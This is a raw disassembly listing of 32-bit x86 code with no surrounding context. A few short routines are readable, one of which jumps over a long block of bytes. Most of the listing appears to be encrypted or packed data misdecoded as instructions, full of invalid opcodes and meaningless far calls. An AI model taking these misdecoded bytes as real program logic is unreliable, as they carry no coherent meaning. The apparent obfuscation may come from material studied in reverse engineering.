  405232:	adc    BYTE PTR [edx],cl
  405234:	test   BYTE PTR [edi-0x6375965a],cl
  40523a:	popa   
  40523b:	mov    DWORD PTR [ebp+0xc],eax
  40523e:	mov    eax,DWORD PTR [ebp-0x4]
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0x9a7e0339
  40528d:	into   
  40528e:	pop    ebx
  40528f:	sub    bh,BYTE PTR [esi+0x7e]
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x4052c9
  405297:	ffreep st(4)
  405299:	stc    
  40529a:	popa   
  40529b:	(bad)  
  40529d:	retf   
  40529e:	sub    eax,0xf6172e34
  4052a3:	scas   eax,DWORD PTR es:[edi]
  4052a4:	mov    cl,0xca
  4052a6:	dec    ecx
  4052a7:	cmc    
  4052a8:	push   edx
  4052a9:	hlt    
  4052aa:	stc    
  4052ab:	call   0xf2f8:0x4d8cfb3c
  4052b2:	mov    esp,0xa0f52a4b
  4052b7:	(bad)  
  4052b8:	add    BYTE PTR [ecx+0x2a],dl
  4052bb:	xor    BYTE PTR [ebx+edi*2],bh
  4052be:	test   BYTE PTR [ecx],ah
  4052c0:	mov    bh,0x83
  4052c2:	xor    al,0xce
  4052c4:	popf   
  4052c5:	push   eax
  4052c6:	or     al,0x63
  4052c8:	dec    eax
  4052c9:	push   esp
  4052ca:	mov    dl,BYTE PTR [ebx-0x258dbc8]
  4052d0:	outs   dx,DWORD PTR ds:[esi]
  4052d1:	xor    esp,esi
  4052d3:	or     ebx,ecx
  4052d5:	aas    
  4052d6:	mov    dl,0x53
  4052d8:	scas   eax,DWORD PTR es:[edi]
  4052d9:	push   esp
  4052da:	outs   dx,DWORD PTR ds:[esi]
  4052db:	into   
  4052dc:	sub    eax,0xb8bb45f1
  4052e1:	les    edi,FWORD PTR ds:0x278e650a
  4052e7:	pop    eax
  4052e8:	push   cs
  4052e9:	jg     0x405292
  4052eb:	pop    ss
  4052ec:	call   0x5763:0x76b97005
  4052f3:	jno    0x4052cf
  4052f5:	je     0x405374
  4052f7:	retf   0x46e8
  4052fa:	cli    
  4052fb:	div    DWORD PTR [ecx-0x3b]
  4052fe:	jle    0x405362
  405300:	clc    
  405301:	aam    0xc7
  405303:	pop    ds
  405304:	sbb    BYTE PTR [esp+ebp*1-0x2f454778],0xbe
  40530c:	inc    esp
  40530d:	int    0x85
  40530f:	test   eax,0xc8b55a02
  405314:	mov    esp,0xa6038e6b
  405319:	push   eax
  40531a:	xchg   esi,eax
  40531b:	(bad)  
  40531c:	test   eax,0x9cd6e9ad
  405321:	sahf   
  405322:	cmp    BYTE PTR [ebx],0xe2
  405325:	fistp  DWORD PTR [edi+edi*4-0x7519c9d6]
  40532c:	enter  0xcf6c,0xbf
  405330:	mov    eax,ds:0x23f578e
  405335:	je     0x4053a4
  405337:	pop    DWORD PTR [edx-0x55]
  40533a:	pushf  
  40533b:	hlt    
  40533c:	add    BYTE PTR [ecx+0x60],0x97
  405340:	(bad)  
  405341:	jl     0x40535f
  405343:	sub    dh,cl
  405345:	xchg   DWORD PTR [edx+0x362783b6],ecx
  40534b:	cld    
  40534c:	(bad)  [eax+0x59eed174]
  405352:	das    
  405353:	push   esi
  405354:	pop    ebp
  405355:	sahf   
  405356:	xor    BYTE PTR [ebp-0x2],bl
  405359:	scas   al,BYTE PTR es:[edi]
  40535a:	in     al,0xde
  40535c:	sbb    ch,ch
  40535e:	inc    edx
  40535f:	xor    edx,DWORD PTR [edx+0x5d]
  405362:	cs sub eax,0x91bb0391
  405368:	jl     0x4053b1
  40536a:	sti    
  40536b:	fisubr DWORD PTR ds:0xf16947d1
  405371:	jae    0x4053ab
  405373:	bound  esp,QWORD PTR [eax]
  405375:	xchg   ecx,eax
  405376:	pop    edx
  405377:	jmp    0xca37:0x2175ddcf
  40537e:	lods   eax,DWORD PTR ds:[esi]
  40537f:	adc    al,0xae
  405381:	pusha  
  405382:	cs aaa 
  405384:	loopne 0x4053a3
  405386:	into   
  405387:	adc    ah,BYTE PTR [edx]
  405389:	cs (bad) 
  40538b:	mov    bl,0xdd
  40538d:	xchg   edi,eax
  40538e:	imul   ebx,esp,0xc1fb4d32
  405394:	jns    0x4053e6
  405396:	mov    dl,0xc7
  405398:	popf   
  405399:	cvtdq2ps xmm4,XMMWORD PTR [eax*1+0x19fea831]
  4053a1:	dec    esp
  4053a2:	pop    esi
  4053a3:	sub    DWORD PTR [edx*2-0x55e5fbfd],0xffffff86
  4053ab:	sub    DWORD PTR [ebp+0x11],0x4fe4956f
  4053b2:	pop    esp
  4053b3:	rcr    eax,1
  4053b5:	mov    ebp,edx
  4053b7:	jl     0x405408
  4053b9:	xchg   esp,eax
  4053ba:	idiv   BYTE PTR [edx-0x3937b8b]
  4053c0:	mov    ebx,0xb4084c2d
  4053c5:	repz xor eax,0x10e30d24
  4053cb:	xchg   ebx,eax
  4053cc:	fcom   st(2)
  4053ce:	jmp    0x405449
  4053d0:	nop
  4053d1:	out    dx,eax
  4053d2:	cli    
  4053d3:	jp     0x40542c
  4053d5:	xor    edx,ebp
  4053d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053d8:	or     DWORD PTR [ecx+ebx*1+0x15],ebx
  4053dc:	test   al,0xf4
  4053de:	popa   
  4053df:	dec    edi
  4053e0:	dec    edx
  4053e1:	xchg   edi,eax
  4053e2:	pop    ebp
  4053e3:	mov    cl,0xf
  4053e5:	repz ds leave 
  4053e8:	dec    edx
  4053e9:	mov    cl,0xf8
  4053eb:	adc    al,0xfc
  4053ed:	(bad)  
  4053ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053ef:	stos   DWORD PTR es:[edi],eax
  4053f0:	mov    ebp,0x8fea9c9b
  4053f5:	aaa    
  4053f6:	add    cl,BYTE PTR [ebp+0x29]
  4053f9:	(bad)  
  4053fb:	lods   al,BYTE PTR ds:[esi]
  4053fc:	mov    dl,0x17
  4053fe:	cld    
  4053ff:	inc    ecx
  405400:	xlat   BYTE PTR ds:[ebx]
  405401:	fsubr  DWORD PTR [esi-0x2c24fef1]
  405407:	mov    ebx,0xff17f858
  40540c:	int3   
  40540d:	cmp    dh,BYTE PTR [esi+0x29e47aa3]
  405413:	cmp    al,0xb2
  405415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405416:	call   0xc204893d
  40541b:	clc    
  40541c:	(bad)  
  40541d:	cmp    ah,al
  40541f:	sbb    dh,BYTE PTR ds:[ecx+0x28766a13]
  405426:	jmp    0xd1c6bfe1
  40542b:	jne    0x405441
  40542d:	xor    al,0xf1
  40542f:	out    dx,al
  405430:	add    DWORD PTR [edi],0x73
  405433:	cwde   
  405434:	push   cs
  405435:	push   eax
  405436:	sti    
  405437:	ja     0x4053be
  405439:	(bad)  
  40543a:	test   DWORD PTR ds:0xe5f5b5d8,edi
  405440:	dec    ecx
  405441:	xor    ebx,DWORD PTR [edx+eiz*1+0x1357057d]
  405448:	mov    edx,0x269c0f0f
  40544d:	fs es fwait
  405450:	xor    DWORD PTR [eax],esi
  405452:	and    ch,cl
  405454:	out    0x3a,eax
  405456:	xchg   esi,eax
  405457:	aas    
  405458:	fwait
  405459:	lahf   
  40545a:	repnz out 0x6e,al
  40545d:	inc    ebp
  40545e:	fld    DWORD PTR fs:[bx]
  405462:	jl     0x4054d3
  405464:	sbb    DWORD PTR [esi+0x40],edi
  405467:	xor    al,0xa6
  405469:	int    0xf8
  40546b:	dec    edi
  40546c:	int3   
  40546d:	xor    bh,bh
  40546f:	(bad)  
  405470:	retf   
  405471:	push   0xa80ad2e0
  405476:	jno    0x4054db
  405478:	sbb    DWORD PTR [ebx+0x2684146c],ebx
  40547e:	push   es
  40547f:	add    al,0x82
  405481:	fldenv [eax-0x33fca276]
  405487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405488:	ds mov bl,0xa7
  40548b:	inc    edi
  40548c:	and    dl,dl
  40548e:	mov    BYTE PTR [ebx-0x79afba72],bl
  405494:	imul   eax,DWORD PTR fs:[edx+ebp*2-0x68b2e0fe],0xffffffed
  40549d:	loope  0x4054d2
  40549f:	or     eax,0xd1ab925a
  4054a4:	sub    BYTE PTR ds:[edx],0xa4
  4054a8:	dec    esp
  4054a9:	jmp    0x40545d
  4054ab:	jg     0x405480
  4054ad:	dec    edx
  4054ae:	call   DWORD PTR [ecx-0x55]
  4054b1:	xchg   edi,eax
  4054b2:	clc    
  4054b3:	sub    al,0x8c
  4054b5:	(bad)  
  4054b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054b8:	loop   0x4054a2
  4054ba:	add    dl,BYTE PTR [eax+0x8]
  4054bd:	or     bl,BYTE PTR [ebp+0x162d3d64]
  4054c3:	fwait
  4054c4:	les    ebx,FWORD PTR [eax]
  4054c6:	pop    ds
  4054c7:	or     eax,0x2dfb2b85
  4054cc:	and    BYTE PTR [ecx],dl
  4054ce:	or     BYTE PTR [esi],0x86
  4054d1:	sub    ebp,ecx
  4054d3:	push   0xffffffe4
  4054d5:	jne    0x405508
  4054d7:	imul   edx,DWORD PTR [edi+esi*4+0x4e],0x6034df17
  4054df:	cmp    BYTE PTR [eax-0x57a0acff],al
  4054e5:	leave  
  4054e6:	inc    ebp
  4054e7:	fdiv   DWORD PTR [edi]
  4054e9:	retf   
  4054ea:	mov    ds:0x3da04e20,al
  4054ef:	adc    bl,bh
  4054f1:	aas    
  4054f2:	adc    BYTE PTR [esi-0x48],0x29
  4054f6:	addr16 (bad) 
  4054f9:	pop    esp
  4054fa:	xchg   esi,eax
  4054fb:	loope  0x405534
  4054fd:	cld    
  4054fe:	jbe    0x40550a
  405500:	mov    ebp,0x67e27239
  405505:	xchg   BYTE PTR [esi],dh
  405507:	fild   DWORD PTR [ebp-0x2c28cf39]
  40550d:	ret    
  40550e:	cmc    
  40550f:	or     eax,0x6d90df1a
  405514:	pop    ds
  405515:	dec    esp
  405516:	sbb    eax,0xe99909e3
  40551b:	sahf   
  40551c:	scas   al,BYTE PTR es:[edi]
  40551d:	mov    esi,0xe333241e
  405522:	ror    DWORD PTR [edx],cl
  405524:	and    edi,DWORD PTR ss:[ebx-0x33de8f43]
  40552b:	lds    esi,FWORD PTR [ecx-0x50]
  40552e:	add    esi,0x29
  405531:	retf   
  405532:	or     al,0xb5
  405534:	sbb    edx,ebx
  405536:	sahf   
  405537:	xor    al,0x72
  405539:	into   
  40553a:	jmp    0x405580
  40553c:	mov    dl,0x49
  40553e:	sbb    BYTE PTR [ecx+0x3b64e376],dl
  405544:	or     al,BYTE PTR [eax+ebp*8+0x14240f79]
  40554b:	shl    DWORD PTR [edi-0x6d6b4174],1
  405551:	in     al,0x51
  405553:	sbb    al,0x95
  405555:	leave  
  405556:	pushf  
  405557:	push   ebx
  405558:	xchg   BYTE PTR [eax-0x7],cl
  40555b:	cmc    
  40555c:	pop    edi
  40555d:	xchg   ebp,eax
  40555e:	lods   eax,DWORD PTR ds:[esi]
  40555f:	iret   
  405560:	xor    al,0x73
  405562:	dec    ebp
  405563:	jmp    0x4865b921
  405568:	xor    al,0x7e
  40556a:	test   al,0x10
  40556c:	push   es
  40556d:	pop    ds
  40556e:	jmp    0x53f62658
  405573:	call   0x6d761904
  405578:	pop    es
  405579:	std    
  40557a:	fild   QWORD PTR [esi-0x522e604a]
  405580:	idiv   DWORD PTR [edx]
  405582:	adc    edx,DWORD PTR [ebp+0x11fadbe0]
  405588:	addr16 inc ebx
  40558a:	sub    ebx,DWORD PTR [esi+0x21fcd041]
  405590:	cmp    al,0x4d
  405592:	sbb    eax,0xb35a0085
  405597:	aaa    
  405598:	es aam 0xdd
  40559b:	add    DWORD PTR [esi+0x67],edi
  40559e:	hlt    
  40559f:	pop    ecx
  4055a0:	(bad)  
  4055a1:	push   cs
  4055a2:	lods   eax,DWORD PTR ds:[esi]
  4055a3:	add    eax,0x5ceb54af
  4055a8:	mov    esp,0x977e71bb
  4055ad:	mov    ebp,0x3202e5f1
  4055b2:	arpl   WORD PTR [edi-0x6],dx
  4055b5:	mov    WORD PTR [ebp+0x5f],?
  4055b8:	lea    edi,[edi+0x7d74b8d4]
  4055be:	shl    BYTE PTR ds:0xc0d005f2,cl
  4055c4:	add    eax,0x64324d63
  4055c9:	lea    esp,[esi+0x65f11702]
  4055cf:	and    ecx,ecx
  4055d1:	adc    BYTE PTR [edi],cl
  4055d3:	inc    esp
  4055d4:	hlt    
  4055d5:	adc    BYTE PTR [esi],ch
  4055d7:	fadd   DWORD PTR [ebx+ebx*1]
  4055da:	aad    0x4c
  4055dc:	push   ecx
  4055dd:	mov    eax,0x5a3fc9f
  4055e2:	mov    DWORD PTR [ebp-0x4],eax
  4055e5:	mov    DWORD PTR ds:0x4344f3,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	cs ss mov eax,0x362107c1
  405609:	jle    0x405689
  40560b:	les    edi,FWORD PTR [ecx+0x7e]
  40560e:	jle    0x405611
  405610:	cmc    
  405611:	aaa    
  405612:	add    al,0x58
  405614:	mov    ecx,0xc394788e
  405619:	out    0x2e,al
  40561b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40561c:	scas   eax,DWORD PTR es:[edi]
  40561d:	fcom   DWORD PTR [edi]
  40561f:	mov    ch,0x6d
  405621:	add    ebp,ebx
  405623:	iret   
  405624:	push   edi
  405625:	not    cl
  405627:	push   ebx
  405628:	sahf   
  405629:	ror    ebp,0x43
  40562c:	ds inc ecx
  40562e:	inc    ecx
  40562f:	shl    eax,0x37
  405632:	adc    DWORD PTR [edx],ebp
  405634:	push   es
  405635:	cmp    DWORD PTR [ebp+esi*8-0x57],ebp
  405639:	test   dl,dh
  40563b:	lea    esp,[ebx-0x19300592]
  405641:	aam    0xfd
  405643:	test   DWORD PTR [esi+0x3390bcd0],esp
  405649:	cmp    ah,dl
  40564b:	jl     0x405620
  40564d:	jmp    0xe0f1479a
  405652:	fdivr  QWORD PTR [edx-0x44]
  405655:	jae    0x4056a7
  405657:	sbb    BYTE PTR [eax-0x67e75d77],al
  40565d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40565f:	fdiv   QWORD PTR [edi+0x658799ac]
  405665:	add    DWORD PTR [ebp+0x53e55a4e],esi
  40566b:	mov    ebp,0xa51bd9ae
  405670:	add    BYTE PTR [ebx+0x2ed07288],bl
  405676:	(bad)  
  405677:	and    edi,DWORD PTR [edi-0x80]
  40567a:	or     eax,0xa7c78701
  40567f:	sub    eax,0xbf382efd
  405684:	xor    ch,al
  405686:	cwde   
  405687:	dec    ebx
  405688:	inc    ebx
  405689:	(bad)  
  40568a:	out    dx,al
  40568b:	push   edx
  40568c:	sbb    edi,edx
  40568e:	or     ah,BYTE PTR [eax+0x13d5a64]
  405694:	imul   ebp,DWORD PTR [ebx+0x9cfca60],0x86fab0bc
  40569e:	ret    0x5b10
  4056a1:	das    
  4056a2:	(bad)  
  4056a3:	cmp    ebp,DWORD PTR [ebx-0x1d415895]
  4056a9:	adc    eax,0x7d2ebd7d
  4056ae:	fidivr DWORD PTR [edx+ecx*8+0x3b968d9a]
  4056b5:	sti    
  4056b6:	push   ecx
  4056b7:	pushf  
  4056b8:	cmp    BYTE PTR [esi-0x68],bl
  4056bb:	mov    esp,0xe6d4c7e6
  4056c0:	in     eax,0x2c
  4056c2:	shl    DWORD PTR [edx-0x37],1
  4056c5:	lods   eax,DWORD PTR ds:[esi]
  4056c6:	xchg   esi,eax
  4056c7:	cli    
  4056c8:	mov    cl,0x53
  4056ca:	jmp    0x405735
  4056cc:	sahf   
  4056cd:	sub    eax,eax
  4056cf:	adc    DWORD PTR [edx+0x23770725],0x74c05f78
  4056d9:	cmp    eax,0xaff7a169
  4056de:	mul    BYTE PTR [edi+esi*4]
  4056e1:	xchg   ecx,eax
  4056e2:	aas    
  4056e3:	jecxz  0x4056ae
  4056e5:	inc    edx
  4056e6:	push   eax
  4056e7:	push   eax
  4056e8:	xor    dh,BYTE PTR [esi]
  4056ea:	add    ah,BYTE PTR [ecx]
  4056ec:	mov    eax,0xfffaa6f3
  4056f1:	(bad)  
  4056f2:	dec    ebp
  4056f3:	in     al,0x36
  4056f5:	arpl   WORD PTR [eax-0x72],ax
  4056f8:	stos   DWORD PTR es:[edi],eax
  4056f9:	in     eax,0xa0
  4056fb:	sub    eax,0x7a724501
  405700:	or     ebp,edi
  405702:	jmp    0xb17defc8
  405707:	mov    bl,0x71
  405709:	jne    0x40568b
  40570b:	mov    cl,0xfa
  40570d:	cmp    eax,0x4683ddfe
  405712:	xchg   ebp,eax
  405713:	cmp    DWORD PTR [ebx],esi
  405715:	adc    al,0xd7
  405717:	cmp    dl,BYTE PTR [eax-0x16]
  40571a:	xor    bl,bh
  40571c:	mov    ah,0x8
  40571e:	and    al,BYTE PTR [edx+ebx*8]
  405721:	mov    ebx,0x2474a38b
  405726:	mov    edi,0xd1442d3d
  40572b:	and    ebx,ebp
  40572d:	cld    
  40572e:	out    0xd4,eax
  405730:	fcomp  QWORD PTR [ebp+edi*4+0x15]
  405734:	push   edi
  405735:	add    al,0xab
  405737:	gs pop es
  405739:	test   al,0xd5
  40573b:	(bad)  
  40573c:	pop    eax
  40573d:	repnz imul edi,DWORD PTR [edi+0x6f],0x38775b73
  405745:	sub    dh,BYTE PTR [esi]
  405747:	fsub   QWORD PTR ds:0xace11590
  40574d:	mov    ds:0xa310ec0f,eax
  405752:	jg     0x4056f1
  405754:	adc    al,0x30
  405756:	clc    
  405757:	pushf  
  405758:	jmp    0x4057d1
  40575a:	cmp    ebp,DWORD PTR [ebp-0xdbae04f]
  405760:	sti    
  405761:	xor    eax,0xf098b76a
  405766:	mov    ecx,0x1dd82e55
  40576b:	mul    DWORD PTR [edi-0x125a14e5]
  405771:	es mov bl,0x5c
  405774:	(bad)  
  405775:	fisub  DWORD PTR ds:0xbede158e
  40577b:	test   al,0x2d
  40577d:	push   esi
  40577e:	pop    ds
  40577f:	adc    eax,0x89e1c06f
  405784:	xchg   WORD PTR [edx+0x6a],si
  405788:	stos   DWORD PTR es:[edi],eax
  405789:	jo     0x4057d8
  40578b:	out    0x80,al
  40578d:	xor    edx,ebp
  40578f:	sub    eax,0xb8b90eb7
  405794:	ret    
  405795:	ret    
  405796:	aad    0xd3
  405798:	icebp  
  405799:	mov    ah,0xba
  40579b:	pop    esp
  40579c:	mov    bh,0x8e
  40579e:	push   esp
  40579f:	or     cl,BYTE PTR [edx+0x5ec61b3d]
  4057a5:	inc    ebx
  4057a6:	mov    dl,BYTE PTR [ebx+0x12]
  4057a9:	xor    ecx,DWORD PTR [ebp-0x4]
  4057ac:	mov    WORD PTR [edx+0x1a45b16f],fs
  4057b2:	arpl   WORD PTR [ebp+edx*2+0x7fa66192],bx
  4057b9:	mov    edi,0xbeeb21a3
  4057be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057bf:	xchg   DWORD PTR [esi],esi
  4057c1:	push   eax
  4057c2:	leave  
  4057c3:	adc    BYTE PTR ds:0x27632d01,0xa5
  4057ca:	jmp    0x405820
  4057cc:	push   edi
  4057cd:	jmp    FWORD PTR [eax+0x10]
  4057d0:	and    BYTE PTR [edi-0x3c5787c3],bl
  4057d6:	shr    DWORD PTR [edi-0x1b12c433],1
  4057dc:	shl    edi,1
  4057de:	into   
  4057df:	mov    ebp,0x61045f24
  4057e4:	dec    DWORD PTR [edx+0x2841ff3e]
  4057ea:	push   ebx
  4057eb:	and    BYTE PTR ds:0xfafc1c12,bl
  4057f1:	cmp    eax,0xcef3fd77
  4057f6:	or     DWORD PTR [esi],esi
  4057f8:	xchg   DWORD PTR [edi-0x5b],ebx
  4057fb:	jno    0x4057a0
  4057fd:	enter  0x6c50,0x92
  405801:	in     al,dx
  405802:	pop    edx
  405803:	mul    esp
  405805:	into   
  405806:	pusha  
  405807:	fxch   st(6)
  405809:	jp     0x4057d6
  40580b:	xor    eax,0x467942c0
  405810:	cmp    BYTE PTR [esi-0x4649c530],al
  405816:	dec    ecx
  405817:	inc    esp
  405818:	cmp    ah,BYTE PTR [edx+0x28]
  40581b:	xor    al,BYTE PTR [ecx]
  40581d:	popf   
  40581e:	rcl    DWORD PTR ss:[edx+edx*4],cl
  405822:	dec    ebp
  405823:	aam    0x95
  405825:	dec    esp
  405826:	fild   DWORD PTR [esi+edi*2+0x1d]
  40582a:	push   esp
  40582b:	jae    0x4057ca
  40582d:	xor    al,0xf3
  40582f:	dec    eax
  405830:	in     eax,dx
  405831:	dec    edx
  405832:	les    edi,FWORD PTR [ecx-0x530640f6]
  405838:	out    0xfb,al
  40583a:	fs and al,0x8b
  40583e:	fwait
  40583f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405840:	(bad)  
  405841:	mov    ?,WORD PTR [ebx-0x5146c51b]
  405847:	mov    dh,ch
  405849:	jno    0x40582e
  40584b:	ret    0xa10e
  40584e:	jl     0x40582a
  405850:	mov    eax,ds:0xe551504d
  405855:	popf   
  405856:	push   es
  405857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405858:	imul   edi,DWORD PTR [edx+edi*2-0x31],0xd8b4cc7a
  405860:	xchg   ebp,eax
  405861:	mov    edi,DWORD PTR ss:[ebx-0x5bdbdbba]
  405868:	fcomip st,st(3)
  40586a:	mov    bh,0x44
  40586c:	push   edx
  40586d:	out    0x33,eax
  40586f:	sbb    al,0x77
  405871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405872:	mov    ah,0x5a
  405874:	inc    ebx
  405875:	or     eax,0x12ffdfb3
  40587a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40587b:	test   al,0xf8
  40587d:	in     al,0x7a
  40587f:	xor    ecx,DWORD PTR [ebp+0x6d]
  405882:	enter  0x3736,0x4d
  405886:	aam    0x87
  405888:	dec    ebp
  405889:	sar    DWORD PTR [ebp-0x6d],1
  40588c:	lahf   
  40588d:	dec    edi
  40588e:	add    al,0x98
  405890:	in     al,dx
  405891:	xchg   ecx,eax
  405892:	xor    BYTE PTR fs:[edx],cl
  405895:	pop    esi
  405896:	mov    bh,0xb8
  405898:	cmp    dh,BYTE PTR [ebp-0x49]
  40589b:	lds    eax,FWORD PTR [edx+0x5933beb4]
  4058a1:	adc    BYTE PTR [eax+ebx*2],bh
  4058a4:	inc    esp
  4058a5:	dec    edx
  4058a6:	fld    DWORD PTR [ebp-0x664b8562]
  4058ac:	jmp    0x92b0:0xe524f5e1
  4058b3:	in     al,0x66
  4058b5:	xchg   esp,eax
  4058b6:	leave  
  4058b7:	cvtps2pi mm5,xmm2
  4058ba:	add    eax,0x1560d84f
  4058bf:	mov    DWORD PTR [eax],ecx
  4058c1:	std    
  4058c2:	add    ebp,DWORD PTR [eax+0x47]
  4058c5:	adc    eax,0x85bc51a7
  4058ca:	es out 0x28,al
  4058cd:	xor    edx,DWORD PTR [eax-0x5b9143b5]
  4058d3:	dec    eax
  4058d4:	ja     0x405904
  4058d6:	sbb    BYTE PTR [esp+ebx*4],0x38
  4058da:	aaa    
  4058db:	sbb    eax,0xe94a0fb5
  4058e0:	ins    BYTE PTR es:[di],dx
  4058e2:	sub    dl,0x34
  4058e5:	popa   
  4058e6:	or     bl,dh
  4058e8:	shr    edi,0xcd
  4058eb:	stos   DWORD PTR es:[edi],eax
  4058ec:	jp     0x4058d1
  4058ee:	add    ebp,DWORD PTR [esi]
  4058f0:	xor    eax,0x9d9f3bd0
  4058f5:	xchg   DWORD PTR [edx+0xe4d57f5],ebx
  4058fb:	sahf   
  4058fc:	es in  al,dx
  4058fe:	fld    QWORD PTR [ebx+0x7d8d7943]
  405904:	(bad)  
  405906:	mov    eax,ds:0xe40fd7d1
  40590b:	imul   ch
  40590d:	or     eax,DWORD PTR [edi]
  40590f:	mov    al,0x32
  405911:	and    al,0xd6
  405913:	and    DWORD PTR cs:[eax+0x25],esp
  405917:	sbb    eax,0xc414558f
  40591c:	aaa    
  40591d:	mov    ah,0xe1
  40591f:	inc    esp
  405920:	push   ss
  405921:	inc    eax
  405922:	dec    ecx
  405923:	or     DWORD PTR [edx-0x5b],0x9aaa0563
  40592a:	inc    ecx
  40592b:	(bad)  
  40592c:	push   ds
  40592d:	fdivr  st,st(5)
  40592f:	fdivr  DWORD PTR [ebx-0x7fafa08d]
  405935:	add    al,0x67
  405937:	(bad)  
  405938:	mov    ebx,0x281d980
  40593d:	fiadd  DWORD PTR [ebx-0x732b5fd9]
  405943:	xor    bl,ch
  405945:	loopne 0x4058e9
  405947:	mov    esp,0x6a5d000c
  40594c:	mov    edi,0xbecd3027
  405951:	out    dx,al
  405952:	icebp  
  405953:	pop    edi
  405954:	mov    edi,eax
  405956:	inc    ebp
  405957:	clc    
  405958:	cmp    DWORD PTR [edi+0x0],ecx
  40595b:	add    bh,al
  40595d:	add    eax,0x4345d3
  405962:	dec    edx
  405963:	and    al,BYTE PTR [eax]
  405965:	add    cl,ch
  405967:	pop    esi
  405968:	add    eax,DWORD PTR [eax]
  40596a:	add    BYTE PTR [edx+0x71b8a1ab],bh
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	or     dh,ch
  405979:	scas   eax,DWORD PTR es:[edi]
  40597a:	dec    esi
  40597b:	out    dx,eax
  40597c:	xor    DWORD PTR [esi+0x7e],edi
  40597f:	les    edi,FWORD PTR [ecx+0x7e]
  405982:	jle    0x4059ae
  405984:	das    
  405985:	fistp  QWORD PTR [ebp-0x56bd33c0]
  40598b:	outs   dx,BYTE PTR ds:[esi]
  40598c:	mov    ecx,0x57365034
  405991:	outs   dx,DWORD PTR ds:[esi]
  405992:	push   es
  405993:	cmp    ah,BYTE PTR [edi-0x5a974b8d]
  405999:	mov    dl,0x56
  40599b:	pop    ebx
  40599c:	fimul  WORD PTR [edi-0x35]
  40599f:	dec    ebx
  4059a0:	mov    ds:0xf053122d,eax
  4059a5:	jae    0x405983
  4059a7:	out    dx,eax
  4059a8:	lods   eax,DWORD PTR ds:[esi]
  4059a9:	mov    ch,0xea
  4059ab:	dec    ecx
  4059ac:	jns    0x405a2b
  4059ae:	inc    edx
  4059af:	daa    
  4059b0:	stos   BYTE PTR es:[edi],al
  4059b1:	pop    ds
  4059b2:	jo     0x4059d4
  4059b4:	fadd   QWORD PTR [edi+0x33]
  4059b7:	mov    BYTE PTR [eax-0x30bb33a2],0x16
  4059be:	repnz stos DWORD PTR es:[edi],eax
  4059c0:	and    dl,BYTE PTR [eax+0x2246180e]
  4059c6:	push   esp
  4059c7:	test   al,0x77
  4059c9:	ret    0x5654
  4059cc:	stos   BYTE PTR es:[edi],al
  4059cd:	push   eax
  4059ce:	adc    ah,bl
  4059d0:	add    al,0xf6
  4059d2:	pop    DWORD PTR [edx+0x9]
  4059d5:	bound  edx,QWORD PTR [eax-0x46]
  4059d8:	inc    esp
  4059d9:	mov    bh,0x72
  4059db:	or     ecx,DWORD PTR fs:[ecx-0xf]
  4059df:	push   ecx
  4059e0:	xchg   esp,eax
  4059e1:	das    
  4059e2:	int    0xc3
  4059e4:	jecxz  0x405a64
  4059e6:	jge    0x405a3d
  4059e8:	mov    edi,0x39033bc9
  4059ed:	fs and eax,0x58002638
  4059f3:	test   eax,0x6114527d
  4059f8:	mov    edi,DWORD PTR [esi-0x3f6d7f11]
  4059fe:	cmp    DWORD PTR [ebx-0x6e],ebx
  405a01:	jl     0x4059f2
  405a03:	imul   DWORD PTR [ebx-0x7fe1f028]
  405a09:	jg     0x4059d7
  405a0b:	loope  0x40599b
  405a0d:	jecxz  0x405a25
  405a0f:	add    BYTE PTR [edi+0x26],0x9f
  405a13:	or     eax,0x2469e3b
  405a18:	sar    dl,cl
  405a1a:	mov    ah,ch
  405a1c:	or     bl,BYTE PTR [edx]
  405a1e:	xor    esi,DWORD PTR [edi-0x6d]
  405a21:	adc    BYTE PTR [ebx-0x7],0x58
  405a25:	xchg   WORD PTR ds:0xb350b266,bx
  405a2c:	sub    eax,0x716ba516
  405a31:	gs repz repz call 0xbe6319b8
  405a39:	pop    esi
  405a3a:	push   edi
  405a3b:	or     eax,0x24beeb7d
  405a40:	push   ebp
  405a42:	pop    ebx
  405a43:	das    
  405a44:	push   eax
  405a45:	popa   
  405a46:	cdq    
  405a47:	into   
  405a48:	ins    DWORD PTR es:[edi],dx
  405a49:	cli    
  405a4a:	or     al,0xd8
  405a4c:	and    edi,esi
  405a4e:	fs ret 0x6a50
  405a52:	lahf   
  405a53:	scas   eax,DWORD PTR es:[edi]
  405a54:	push   ebp
